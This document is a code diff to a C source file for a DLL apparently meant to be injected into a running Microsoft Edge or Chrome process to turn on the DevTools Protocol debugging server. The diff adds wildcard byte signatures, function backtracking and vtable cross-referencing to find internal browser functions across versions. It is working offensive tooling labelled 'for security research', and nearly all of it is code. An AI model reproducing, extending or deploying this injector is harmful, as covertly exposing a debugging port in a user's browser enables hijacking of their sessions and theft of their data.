@@ -1,6 +1,6 @@
 /*
- * CDP Injector DLL for Microsoft Edge
- * Enables Chrome DevTools Protocol on a running Edge browser process.
+ * CDP Injector DLL for Microsoft Edge/Chrome
+ * Enables Chrome DevTools Protocol on a running browser process.
  * For security research purposes only.
  *
  * Build: cl /LD /O2 cdp_inject.c /Fe:cdp_inject.dll user32.lib
@@ -13,6 +13,9 @@
 /* Set this to 1 to enable debug logging, 0 to disable (no-op) */
 #define DEBUG_ENABLED 1
 
+/* Target configuration - change this to switch between Edge and Chrome */
+#define TARGET_DLL "chrome.dll"           /* "chrome.dll" for Chrome */
+
 #include <windows.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -20,7 +23,7 @@
 #pragma comment(lib, "user32.lib")
 
 /* Configuration */
-#define CDP_PORT 8181
+#define CDP_PORT 8182
 #define WM_START_CDP (WM_USER + 0x1337)
 
 /* TCPServerSocketFactory layout (from WinDbg analysis of working Edge):
@@ -73,69 +76,108 @@ static volatile LONG g_cdp_started = 0;
 static HMODULE g_this_module = NULL;
 
 /*
- * Signatures extracted from msedge.dll version 143.0.3650.96
- * These are the minimum unique byte sequences to identify each symbol.
+ * Universal signatures for Chrome/Edge (tested on Chrome 143.0.7499.170, Edge 143.0.3650.96)
+ * These signatures work on both browsers using wildcard masks.
  */
 
-/* Signature for StartRemoteDebuggingServer (in .text section)
- * RVA: 0x02CED39A, 26 bytes minimum */
+/* Signature for StartRemoteDebuggingServer - matches INSIDE the function
+ * Pattern: mov ecx, 0x88; call operator_new; mov r15, rax; mov rax, [rsi]; xor r12d, r12d; mov [rsi], r12
+ * This pattern appears at offset +63 (Chrome) or +55 (Edge) from function start.
+ * After finding the pattern, backtrack to find the function prologue. */
 static const uint8_t SIG_START_SERVER[] = {
-    0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57,
-    0x53, 0x48, 0x83, 0xEC, 0x48, 0x4C, 0x89, 0xC3,
-    0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0x48, 0x8B,
-    0x05, 0x89
+    0xB9, 0x88, 0x00, 0x00, 0x00,                    /* 0-4:   mov ecx, 0x88 (sizeof DevToolsHttpHandler) */
+    0xE8, 0x00, 0x00, 0x00, 0x00,                    /* 5-9:   call operator new */
+    0x49, 0x89, 0xC7,                                /* 10-12: mov r15, rax */
+    0x48, 0x8B, 0x06,                                /* 13-15: mov rax, [rsi] */
+    0x45, 0x31, 0xE4,                                /* 16-18: xor r12d, r12d */
+    0x4C, 0x89, 0x26                                 /* 19-21: mov [rsi], r12 */
 };
-#define SIG_START_SERVER_LEN 26
+static const uint8_t SIG_START_SERVER_MASK[] = {
+    1, 1, 1, 1, 1,  /* mov ecx, 0x88 - must match */
+    1, 0, 0, 0, 0,  /* call - opcode match, offset wildcard */
+    1, 1, 1,        /* mov r15, rax - must match */
+    1, 1, 1,        /* mov rax, [rsi] - must match */
+    1, 1, 1,        /* xor r12d, r12d - must match */
+    1, 1, 1         /* mov [rsi], r12 - must match */
+};
+#define SIG_START_SERVER_LEN 22
+
+/* Function prologue to verify StartRemoteDebuggingServer after backtracking */
+static const uint8_t SIG_START_SERVER_PROLOGUE[] = {
+    0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57,  /* push r15/r14/r12/rsi/rdi */
+    0x53, 0x48, 0x83, 0xEC, 0x48                      /* push rbx; sub rsp, 0x48 */
+};
+#define SIG_START_SERVER_PROLOGUE_LEN 13
+/* Backtrack offsets to try (Chrome=63, Edge=55) */
+#define SIG_START_SERVER_BACKTRACK_CHROME 63
+#define SIG_START_SERVER_BACKTRACK_EDGE 55
 
 /* Signature for operator new (in .text section)
- * RVA: 0x03263588, 10 bytes minimum */
+ * Pattern: push rbx; sub rsp, 0x20; mov rbx, rcx; jmp; mov rcx, rbx; call _callnewh; test eax, eax */
 static const uint8_t SIG_OPERATOR_NEW[] = {
-    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,
-    0xD9, 0xEB
+    0x40, 0x53,                                      /* 0-1:   push rbx (REX prefix) */
+    0x48, 0x83, 0xEC, 0x20,                          /* 2-5:   sub rsp, 0x20 */
+    0x48, 0x8B, 0xD9,                                /* 6-8:   mov rbx, rcx */
+    0xEB, 0x00,                                      /* 9-10:  jmp +offset */
+    0x48, 0x8B, 0xCB,                                /* 11-13: mov rcx, rbx */
+    0xE8, 0x00, 0x00, 0x00, 0x00,                    /* 14-18: call _callnewh */
+    0x85, 0xC0,                                      /* 19-20: test eax, eax */
+    0x74, 0x00,                                      /* 21-22: je +offset */
+    0x48, 0x8B, 0xCB                                 /* 23-25: mov rcx, rbx */
 };
-#define SIG_OPERATOR_NEW_LEN 10
+static const uint8_t SIG_OPERATOR_NEW_MASK[] = {
+    1, 1,           /* push rbx */
+    1, 1, 1, 1,     /* sub rsp, 0x20 */
+    1, 1, 1,        /* mov rbx, rcx */
+    1, 0,           /* jmp - offset wildcard */
+    1, 1, 1,        /* mov rcx, rbx */
+    1, 0, 0, 0, 0,  /* call - offset wildcard */
+    1, 1,           /* test eax, eax */
+    1, 0,           /* je - offset wildcard */
+    1, 1, 1         /* mov rcx, rbx */
+};
+#define SIG_OPERATOR_NEW_LEN 26
 
-/* Signature for DevToolsManager::GetInstance (in .text section)
- * RVA: 0x021B6B94, 16 bytes minimum */
-static const uint8_t SIG_GET_INSTANCE[] = {
-    0xE9, 0x01, 0x00, 0x00, 0x00, 0xCC, 0x56, 0x57,
-    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x35, 0x89
-};
-#define SIG_GET_INSTANCE_LEN 16
+/* GetInstance is derived at runtime from StartRemoteDebuggingServer.
+ * No static signature needed - see ResolveGetInstance(). */
 
 /* To find the TCPServerSocketFactory vtable, we:
- * 1. Find vtable entry functions by signature 
- * 2. Search .rdata for consecutive pointers to these functions
- *
- * vtable[0] = scalar deleting destructor
- * vtable[1] = CreateForHttpServer
+ * 1. Find destructor candidates by signature (may have multiple matches)
+ * 2. Find CreateForHttpServer by signature (unique)
+ * 3. Search .rdata for consecutive pointers [destructor, CreateForHttpServer]
+ * This cross-reference uniquely identifies both the correct destructor and vtable.
  */
 
 /* Signature for scalar deleting destructor (vtable[0])
- * Bytes 17-20 are a relative call offset (E8 xx xx xx xx) - use wildcards
- * Extended to include next function's prologue for uniqueness */
+ * This may match multiple functions - we find the correct one via vtable cross-reference */
 static const uint8_t SIG_VTABLE_ENTRY0[] = {
-    0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE,  /* 0-7 */
-    0xF6, 0xC2, 0x01, 0x74, 0x08, 0x48, 0x89, 0xF1,  /* 8-15 */
-    0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF0,  /* 16-23: E8=call opcode, 17-20=wildcard */
-    0x48, 0x83, 0xC4, 0x20, 0x5E, 0xC3, 0xCC, 0xCC,  /* 24-31 */
-    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x89   /* 32-39: next function's prologue */
+    0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE,  /* 0-7:   push rsi; sub rsp, 0x20; mov rsi, rcx */
+    0xF6, 0xC2, 0x01, 0x74, 0x08, 0x48, 0x89, 0xF1,  /* 8-15:  test dl, 1; jz +8; mov rcx, rsi */
+    0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF0,  /* 16-23: call operator delete; mov rax, rsi */
+    0x48, 0x83, 0xC4, 0x20, 0x5E, 0xC3               /* 24-29: add rsp, 0x20; pop rsi; ret */
 };
 static const uint8_t SIG_VTABLE_ENTRY0_MASK[] = {
     1, 1, 1, 1, 1, 1, 1, 1,  /* 0-7: must match */
     1, 1, 1, 1, 1, 1, 1, 1,  /* 8-15: must match */
-    1, 0, 0, 0, 0, 1, 1, 1,  /* 16-23: E8 must match, 17-20 wildcard, rest match */
-    1, 1, 1, 1, 1, 1, 1, 1,  /* 24-31: must match */
-    1, 1, 1, 1, 1, 1, 1, 1   /* 32-39: must match (next func prologue) */
+    1, 0, 0, 0, 0, 1, 1, 1,  /* 16-23: call offset wildcard */
+    1, 1, 1, 1, 1, 1         /* 24-29: must match */
 };
-#define SIG_VTABLE_ENTRY0_LEN 40
+#define SIG_VTABLE_ENTRY0_LEN 30
 
-/* Signature for CreateForHttpServer (vtable[1]) */
+/* Signature for CreateForHttpServer (vtable[1]) - unique in both Chrome/Edge */
 static const uint8_t SIG_VTABLE_ENTRY1[] = {
-    0x48, 0x89, 0xD0, 0x0F, 0xB7, 0x51, 0x08, 0x48,
-    0x89, 0xC1, 0xE9
+    0x48, 0x89, 0xD0,                                /* 0-2:   mov rax, rdx */
+    0x0F, 0xB7, 0x51, 0x08,                          /* 3-6:   movzx edx, word [rcx+8] (port) */
+    0x48, 0x89, 0xC1,                                /* 7-9:   mov rcx, rax */
+    0xE9, 0x00, 0x00, 0x00, 0x00                     /* 10-14: jmp CreateLocalHostServerSocket */
 };
-#define SIG_VTABLE_ENTRY1_LEN 11
+static const uint8_t SIG_VTABLE_ENTRY1_MASK[] = {
+    1, 1, 1,        /* mov rax, rdx */
+    1, 1, 1, 1,     /* movzx edx, word [rcx+8] */
+    1, 1, 1,        /* mov rcx, rax */
+    1, 0, 0, 0, 0   /* jmp - offset wildcard */
+};
+#define SIG_VTABLE_ENTRY1_LEN 15
 
 /* Debug logging (writes to file) */
 #if DEBUG_ENABLED
@@ -232,56 +274,106 @@ static BOOL GetSectionInfo(HMODULE mod, const char* section_name,
     return FALSE;
 }
 
+/* Collect all matches for a signature (for multi-match scenarios like destructor) */
+static int ScanForAllSignatures(const uint8_t* start, size_t size,
+                                 const uint8_t* sig, const uint8_t* mask, size_t sig_len,
+                                 void** out_matches, int max_matches) {
+    int count = 0;
+    const uint8_t* end = start + size - sig_len;
+
+    for (const uint8_t* p = start; p <= end && count < max_matches; p++) {
+        BOOL match = TRUE;
+        for (size_t i = 0; i < sig_len && match; i++) {
+            if (mask == NULL || mask[i]) {
+                if (p[i] != sig[i]) match = FALSE;
+            }
+        }
+        if (match) {
+            out_matches[count++] = (void*)p;
+        }
+    }
+    return count;
+}
+
 /* Resolve symbols using signature scanning */
 static BOOL ResolveSymbolsBySig(void** out_start_server,
                                  void** out_chrome_new,
                                  void** out_get_instance,
                                  void** out_vtable) {
-    HMODULE msedge = NULL;
+    HMODULE browser_dll = NULL;
     uint8_t* text_start = NULL;
     uint8_t* rdata_start = NULL;
     size_t text_size = 0;
     size_t rdata_size = 0;
     void* addr;
     int found = 0;
+    const char* dll_name = NULL;
 
     DebugLog("ResolveSymbolsBySig: Starting signature-based resolution...");
 
-    msedge = GetModuleHandleA("msedge.dll");
-    if (!msedge) {
-        DebugLog("ResolveSymbolsBySig: Failed to get msedge.dll handle");
+    browser_dll = GetModuleHandleA(TARGET_DLL);
+    if (!browser_dll) {
+        DebugLog("ResolveSymbolsBySig: Failed to get %s handle", TARGET_DLL);
         return FALSE;
     }
-    DebugLog("ResolveSymbolsBySig: msedge.dll @ 0x%p", msedge);
+    dll_name = TARGET_DLL;
+    DebugLog("ResolveSymbolsBySig: %s @ 0x%p", dll_name, browser_dll);
 
     /* Get .text section for code signatures */
-    if (!GetSectionInfo(msedge, ".text", &text_start, &text_size)) {
+    if (!GetSectionInfo(browser_dll, ".text", &text_start, &text_size)) {
         DebugLog("ResolveSymbolsBySig: Failed to find .text section");
         return FALSE;
     }
     DebugLog("ResolveSymbolsBySig: .text section @ 0x%p, size=0x%zX", text_start, text_size);
 
-    /* Get .rdata section for vtable signature */
-    if (!GetSectionInfo(msedge, ".rdata", &rdata_start, &rdata_size)) {
+    /* Get .rdata section for vtable search */
+    if (!GetSectionInfo(browser_dll, ".rdata", &rdata_start, &rdata_size)) {
         DebugLog("ResolveSymbolsBySig: Failed to find .rdata section");
         return FALSE;
     }
     DebugLog("ResolveSymbolsBySig: .rdata section @ 0x%p, size=0x%zX", rdata_start, rdata_size);
 
-    /* Scan for StartRemoteDebuggingServer */
+    /* Scan for StartRemoteDebuggingServer using mid-function pattern + backtrack */
     DebugLog("ResolveSymbolsBySig: Scanning for StartRemoteDebuggingServer...");
-    addr = ScanForSignature(text_start, text_size, SIG_START_SERVER, NULL, SIG_START_SERVER_LEN);
+    addr = ScanForSignature(text_start, text_size, SIG_START_SERVER, SIG_START_SERVER_MASK, SIG_START_SERVER_LEN);
     if (addr) {
-        DebugLog("ResolveSymbolsBySig: [SIG] StartRemoteDebuggingServer @ 0x%p", addr);
-        *out_start_server = addr;
-        found++;
+        void* func_start = NULL;
+        uint8_t* pattern_addr = (uint8_t*)addr;
+
+        DebugLog("ResolveSymbolsBySig: Found mid-function pattern @ 0x%p", addr);
+
+        /* Try Chrome backtrack offset (63 bytes) */
+        if (pattern_addr - SIG_START_SERVER_BACKTRACK_CHROME >= text_start) {
+            uint8_t* candidate = pattern_addr - SIG_START_SERVER_BACKTRACK_CHROME;
+            if (memcmp(candidate, SIG_START_SERVER_PROLOGUE, SIG_START_SERVER_PROLOGUE_LEN) == 0) {
+                func_start = candidate;
+                DebugLog("ResolveSymbolsBySig: Verified prologue at Chrome offset (-63)");
+            }
+        }
+
+        /* Try Edge backtrack offset (55 bytes) if Chrome didn't match */
+        if (!func_start && pattern_addr - SIG_START_SERVER_BACKTRACK_EDGE >= text_start) {
+            uint8_t* candidate = pattern_addr - SIG_START_SERVER_BACKTRACK_EDGE;
+            if (memcmp(candidate, SIG_START_SERVER_PROLOGUE, SIG_START_SERVER_PROLOGUE_LEN) == 0) {
+                func_start = candidate;
+                DebugLog("ResolveSymbolsBySig: Verified prologue at Edge offset (-55)");
+            }
+        }
+
+        if (func_start) {
+            DebugLog("ResolveSymbolsBySig: [SIG] StartRemoteDebuggingServer @ 0x%p", func_start);
+            *out_start_server = func_start;
+            found++;
+        } else {
+            DebugLog("ResolveSymbolsBySig: Pattern found but prologue verification failed!");
+        }
     } else {
         DebugLog("ResolveSymbolsBySig: StartRemoteDebuggingServer NOT FOUND!");
     }
 
     /* Scan for operator new */
     DebugLog("ResolveSymbolsBySig: Scanning for operator new...");
-    addr = ScanForSignature(text_start, text_size, SIG_OPERATOR_NEW, NULL, SIG_OPERATOR_NEW_LEN);
+    addr = ScanForSignature(text_start, text_size, SIG_OPERATOR_NEW, SIG_OPERATOR_NEW_MASK, SIG_OPERATOR_NEW_LEN);
     if (addr) {
         DebugLog("ResolveSymbolsBySig: [SIG] operator new @ 0x%p", addr);
         *out_chrome_new = addr;
@@ -290,61 +382,55 @@ static BOOL ResolveSymbolsBySig(void** out_start_server,
         DebugLog("ResolveSymbolsBySig: operator new NOT FOUND!");
     }
 
-    /* Scan for DevToolsManager::GetInstance */
-    DebugLog("ResolveSymbolsBySig: Scanning for DevToolsManager::GetInstance...");
-    addr = ScanForSignature(text_start, text_size, SIG_GET_INSTANCE, NULL, SIG_GET_INSTANCE_LEN);
-    if (addr) {
-        DebugLog("ResolveSymbolsBySig: [SIG] GetInstance @ 0x%p", addr);
-        *out_get_instance = addr;
-        found++;
-    } else {
-        DebugLog("ResolveSymbolsBySig: GetInstance NOT FOUND!");
-    }
+    /* GetInstance will be derived later from StartRemoteDebuggingServer */
+    *out_get_instance = NULL;
 
-    /* Find TCPServerSocketFactory vtable by:
-     * 1. Find vtable entry functions by signature
-     * 2. Search .rdata for consecutive pointers to these functions
-     */
+    /* Find TCPServerSocketFactory vtable by cross-referencing destructor candidates with CreateForHttpServer */
     {
-        void* entry0_fn = NULL;  /* scalar deleting destructor */
-        void* entry1_fn = NULL;  /* CreateForHttpServer */
+        void* destr_candidates[32];
+        int destr_count;
+        void* entry1_fn = NULL;  /* CreateForHttpServer - unique */
 
-        DebugLog("ResolveSymbolsBySig: Finding vtable entry functions by signature...");
+        DebugLog("ResolveSymbolsBySig: Finding vtable via cross-reference...");
 
-        /* Find vtable[0] - scalar deleting destructor (uses mask for wildcard call offset) */
-        entry0_fn = ScanForSignature(text_start, text_size, SIG_VTABLE_ENTRY0, SIG_VTABLE_ENTRY0_MASK, SIG_VTABLE_ENTRY0_LEN);
-        if (entry0_fn) {
-            DebugLog("ResolveSymbolsBySig: vtable[0] (destructor) @ 0x%p", entry0_fn);
-        } else {
-            DebugLog("ResolveSymbolsBySig: vtable[0] NOT FOUND");
-        }
+        /* Find all destructor candidates */
+        destr_count = ScanForAllSignatures(text_start, text_size,
+                                            SIG_VTABLE_ENTRY0, SIG_VTABLE_ENTRY0_MASK, SIG_VTABLE_ENTRY0_LEN,
+                                            destr_candidates, 32);
+        DebugLog("ResolveSymbolsBySig: Found %d destructor candidates", destr_count);
 
-        /* Find vtable[1] - CreateForHttpServer */
-        entry1_fn = ScanForSignature(text_start, text_size, SIG_VTABLE_ENTRY1, NULL, SIG_VTABLE_ENTRY1_LEN);
+        /* Find CreateForHttpServer (unique) */
+        entry1_fn = ScanForSignature(text_start, text_size, SIG_VTABLE_ENTRY1, SIG_VTABLE_ENTRY1_MASK, SIG_VTABLE_ENTRY1_LEN);
         if (entry1_fn) {
-            DebugLog("ResolveSymbolsBySig: vtable[1] (CreateForHttpServer) @ 0x%p", entry1_fn);
+            DebugLog("ResolveSymbolsBySig: CreateForHttpServer @ 0x%p", entry1_fn);
         } else {
-            DebugLog("ResolveSymbolsBySig: vtable[1] NOT FOUND");
+            DebugLog("ResolveSymbolsBySig: CreateForHttpServer NOT FOUND");
         }
 
-        /* Search .rdata for consecutive pointers to these functions */
-        if (entry0_fn && entry1_fn) {
+        /* Search .rdata for vtable containing [destructor, CreateForHttpServer] */
+        if (destr_count > 0 && entry1_fn) {
             const uint64_t* p = (const uint64_t*)rdata_start;
             const uint64_t* end = (const uint64_t*)(rdata_start + rdata_size - 16);
-            addr = NULL;
+            void* found_vtable = NULL;
 
             DebugLog("ResolveSymbolsBySig: Searching .rdata for vtable...");
-            while (p < end) {
-                if (p[0] == (uint64_t)entry0_fn && p[1] == (uint64_t)entry1_fn) {
-                    addr = (void*)p;
-                    break;
+
+            for (int i = 0; i < destr_count && !found_vtable; i++) {
+                uint64_t destr_addr = (uint64_t)destr_candidates[i];
+                uint64_t http_addr = (uint64_t)entry1_fn;
+
+                for (const uint64_t* q = p; q < end; q++) {
+                    if (q[0] == destr_addr && q[1] == http_addr) {
+                        found_vtable = (void*)q;
+                        DebugLog("ResolveSymbolsBySig: Matched destructor[%d] @ 0x%p", i, destr_candidates[i]);
+                        break;
+                    }
                 }
-                p++;
             }
 
-            if (addr) {
-                DebugLog("ResolveSymbolsBySig: [SIG] Factory vtable @ 0x%p", addr);
-                *out_vtable = addr;
+            if (found_vtable) {
+                DebugLog("ResolveSymbolsBySig: [SIG] Factory vtable @ 0x%p", found_vtable);
+                *out_vtable = found_vtable;
                 found++;
             } else {
                 DebugLog("ResolveSymbolsBySig: Factory vtable NOT FOUND in .rdata");
@@ -352,8 +438,46 @@ static BOOL ResolveSymbolsBySig(void** out_start_server,
         }
     }
 
-    DebugLog("ResolveSymbolsBySig: Found %d/4 symbols via signature", found);
-    return (found == 4);
+    /* We need 3 symbols (StartServer, operator new, vtable). GetInstance is derived separately. */
+    DebugLog("ResolveSymbolsBySig: Found %d/3 required symbols via signature", found);
+    return (found == 3);
+}
+
+/* Derive GetInstance from StartRemoteDebuggingServer
+ * The function has different code paths in Chrome vs Edge:
+ * - Chrome: mov r14, [rip+disp32] at offset +0x25 loads instance_ directly
+ * - Edge: call GetInstance at offset +0x25, then mov r14, [rax+8]
+ *
+ * For Edge, we follow the call to find GetInstance.
+ * For Chrome, GetInstance doesn't exist as a separate function (inlined), so we return NULL.
+ */
+static void* DeriveGetInstance(void* start_server) {
+    uint8_t* func = (uint8_t*)start_server;
+
+    /* Check what's at offset +0x25 (after prologue + security cookie setup) */
+    uint8_t* check_addr = func + 0x25;
+
+    /* Edge: E8 xx xx xx xx = call GetInstance */
+    if (check_addr[0] == 0xE8) {
+        int32_t rel_offset;
+        void* target;
+
+        memcpy(&rel_offset, check_addr + 1, sizeof(int32_t));
+        target = check_addr + 5 + rel_offset;
+
+        DebugLog("DeriveGetInstance: Found call at +0x25, target @ 0x%p", target);
+        return target;
+    }
+
+    /* Chrome: 4C 8B 35 xx xx xx xx = mov r14, [rip+disp32] (inlined singleton access) */
+    if (check_addr[0] == 0x4C && check_addr[1] == 0x8B && check_addr[2] == 0x35) {
+        DebugLog("DeriveGetInstance: Chrome uses inlined singleton access, no GetInstance function");
+        return NULL;
+    }
+
+    DebugLog("DeriveGetInstance: Unknown code at +0x25: %02X %02X %02X",
+             check_addr[0], check_addr[1], check_addr[2]);
+    return NULL;
 }
 
 /* Resolve required symbols using signature scanning */
@@ -370,16 +494,26 @@ static BOOL ResolveSymbols(void) {
         return FALSE;
     }
 
+    /* Derive GetInstance from StartRemoteDebuggingServer */
+    if (start_server) {
+        get_instance = DeriveGetInstance(start_server);
+        if (get_instance) {
+            DebugLog("ResolveSymbols: Derived GetInstance @ 0x%p", get_instance);
+        } else {
+            DebugLog("ResolveSymbols: GetInstance not available (Chrome inlines it)");
+        }
+    }
+
     /* Set globals */
     g_start_server = (StartRemoteDebuggingServerFn)start_server;
     g_chrome_new = (ChromeNewFn)chrome_new;
-    g_get_devtools_manager = (GetDevToolsManagerFn)get_instance;
+    g_get_devtools_manager = (GetDevToolsManagerFn)get_instance;  /* May be NULL on Chrome */
     g_factory_vtable = vtable;
 
-    DebugLog("ResolveSymbols: All symbols resolved via signatures!");
+    DebugLog("ResolveSymbols: All required symbols resolved via signatures!");
     DebugLog("ResolveSymbols: StartRemoteDebuggingServer @ 0x%p", g_start_server);
     DebugLog("ResolveSymbols: operator new @ 0x%p", g_chrome_new);
-    DebugLog("ResolveSymbols: DevToolsManager::GetInstance @ 0x%p", g_get_devtools_manager);
+    DebugLog("ResolveSymbols: DevToolsManager::GetInstance @ 0x%p (may be NULL)", g_get_devtools_manager);
     DebugLog("ResolveSymbols: TCPServerSocketFactory vtable @ 0x%p", g_factory_vtable);
 
     return TRUE;
